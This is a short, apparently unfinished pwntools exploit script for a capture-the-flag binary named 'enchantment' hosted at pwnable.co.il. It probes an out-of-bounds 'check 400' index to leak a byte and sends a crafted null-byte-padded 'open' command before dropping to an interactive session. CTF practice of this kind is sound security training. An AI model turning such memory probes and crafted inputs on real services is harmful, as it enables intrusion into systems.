#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./enchantment")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")


if args['REMOTE']:
    io = remote('pwnable.co.il', 9000)
else:
    io = process([elf.path])
    gdb.attach(io)

def check(index):
    io.recvuntil(b'> ')
    io.sendline(f'check {index}')
    
    return io.recv(1)



byte = check(400) 
print(byte)

io.sendline(b'open\x00aaaaaaaa 40\x00')

io.interactive()